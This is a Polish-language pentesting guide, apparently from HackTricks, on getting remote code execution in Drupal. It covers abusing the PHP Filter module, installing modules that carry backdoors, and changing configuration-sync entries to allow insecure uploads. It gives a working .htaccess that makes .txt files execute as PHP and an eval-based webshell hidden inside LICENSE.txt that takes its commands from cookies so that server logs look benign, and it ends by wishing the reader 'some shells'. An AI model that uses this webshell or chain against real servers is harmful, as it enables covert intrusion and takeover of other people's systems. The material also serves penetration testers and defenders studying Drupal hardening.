# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Z modułem PHP Filter

> [!WARNING]
> W starszych wersjach Drupala **(przed wersją 8)**, możliwe było zalogowanie się jako administrator i **włączenie modułu `PHP filter`**, który "Pozwala na ocenę osadzonego kodu/snippetów PHP." Jednak od wersji 8 ten moduł nie jest instalowany domyślnie.

1. Przejdź do **/modules/php** i jeśli zwrócony zostanie błąd 403, to **moduł PHP filter jest zainstalowany i możesz kontynuować**
1. Jeśli nie, przejdź do `Modules` i zaznacz pole `PHP Filter`, a następnie kliknij `Save configuration`
2. Następnie, aby to wykorzystać, kliknij `Add content`, wybierz `Basic Page` lub `Article` i napisz **PHP backdoor**, następnie wybierz kod `PHP` w formacie tekstowym i na koniec wybierz `Preview`
3. Aby to uruchomić, po prostu uzyskaj dostęp do nowo utworzonego węzła:
```bash
curl http://drupal.local/node/3
```
## Zainstaluj moduł PHP Filter

> [!WARNING]
> W obecnych wersjach nie jest już możliwe instalowanie wtyczek tylko przy dostępie do sieci po domyślnej instalacji.

Od wersji **8 wzwyż, moduł** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **nie jest instalowany domyślnie**. Aby skorzystać z tej funkcjonalności, musimy **zainstalować moduł sami**.

1. Pobierz najnowszą wersję modułu ze strony Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Po pobraniu przejdź do **`Administration`** > **`Reports`** > **`Available updates`**.
3. Kliknij **`Browse`**, wybierz plik z katalogu, do którego go pobrano, a następnie kliknij **`Install`**.
4. Po zainstalowaniu modułu możemy kliknąć na **`Content`** i **utworzyć nową stronę podstawową**, podobnie jak w przykładzie Drupal 7. Ponownie upewnij się, że **wybrałeś `PHP code` z rozwijanego menu `Text format`**.

## Moduł z backdoorem

> [!WARNING]
> W obecnych wersjach nie jest już możliwe instalowanie wtyczek tylko przy dostępie do sieci po domyślnej instalacji.

Możliwe było **pobranie** **modułu**, dodanie do niego **backdoora** i **zainstalowanie** go. Na przykład, pobierając moduł [**Trurnstile**](https://www.drupal.org/project/turnstile) w formacie skompresowanym, tworząc nowy plik backdoora PHP wewnątrz niego, umożliwiając dostęp do pliku PHP za pomocą pliku `.htaccess`:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
A następnie przechodzimy do **`http://drupal.local/admin/modules/install`**, aby zainstalować moduł z backdoorem i uzyskać dostęp do **`/modules/turnstile/back.php`**, aby go wykonać.

## Backdooring Drupal z synchronizacją konfiguracji <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post udostępniony przez** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Część 1 (aktywacja _Media_ i _Media Library_)

W menu _Rozszerzenia_ (/admin/modules) możesz aktywować to, co wydaje się być już zainstalowanymi wtyczkami. Domyślnie wtyczki _Media_ i _Media Library_ nie wydają się być aktywowane, więc aktywujmy je.

Przed aktywacją:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Po aktywacji:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Część 2 (wykorzystanie funkcji _Synchronizacja konfiguracji_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wykorzystamy funkcję _Synchronizacja konfiguracji_, aby zrzucić (eksportować) i przesłać (importować) wpisy konfiguracji Drupal:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

Zacznijmy od załatania pierwszego wpisu `allow_insecure_uploads` z:

Plik: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Zaktualizuj pole.field.media.document.field_media_document.yml**

Następnie zaktualizuj drugi wpis `file_extensions` z: 

Plik: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Nie używam tego w tym wpisie na blogu, ale zauważono, że możliwe jest zdefiniowanie wpisu `file_directory` w dowolny sposób i że jest on podatny na atak typu path traversal (możemy więc cofnąć się w drzewie systemu plików Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Część 3 (wykorzystanie funkcji _Dodaj dokument_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Ostatni krok jest najprostszy i dzieli się na dwa podkroki. Pierwszym jest przesłanie pliku w formacie .htaccess, aby wykorzystać dyrektywy Apache i umożliwić interpretację plików .txt przez silnik PHP. Drugim jest przesłanie pliku .txt zawierającego nasz ładunek.

Plik: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Dlaczego ten trik jest fajny?

Ponieważ gdy Webshell (który nazwiemy LICENSE.txt) zostanie umieszczony na serwerze WWW, możemy przesyłać nasze polecenia za pomocą `$_COOKIE`, a w logach serwera WWW pojawi się to jako legalne żądanie GET do pliku tekstowego.

Dlaczego nazywamy nasz Webshell LICENSE.txt?

Po prostu dlatego, że jeśli weźmiemy następujący plik, na przykład [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (który już znajduje się w rdzeniu Drupal), mamy plik o długości 339 linii i rozmiarze 17,6 KB, co jest idealne do dodania małego fragmentu kodu PHP w środku (ponieważ plik jest wystarczająco duży).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Plik: Zaktualizowany LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Część 3.1 (prześlij plik .htaccess)**

Najpierw wykorzystujemy funkcję _Add Document_ (/media/add/document), aby przesłać nasz plik zawierający dyrektywy Apache (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Część 3.2 (prześlij plik LICENSE.txt)**

Następnie ponownie wykorzystujemy funkcję _Add Document_ (/media/add/document), aby przesłać Webshell ukryty w pliku licencyjnym.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Część 4 (interakcja z Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Ostatnia część polega na interakcji z Webshell.

Jak pokazano na poniższym zrzucie ekranu, jeśli ciasteczko oczekiwane przez nasz Webshell nie jest zdefiniowane, otrzymujemy następujący wynik podczas przeglądania pliku za pomocą przeglądarki internetowej.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Gdy atakujący ustawi ciasteczko, może interagować z Webshell i wykonywać dowolne polecenia, które chce.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

I jak widać w logach, wygląda na to, że żądany był tylko plik txt.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Dziękuję za poświęcenie czasu na przeczytanie tego artykułu, mam nadzieję, że pomoże Ci zdobyć kilka shelli.

{{#include ../../../banners/hacktricks-training.md}}
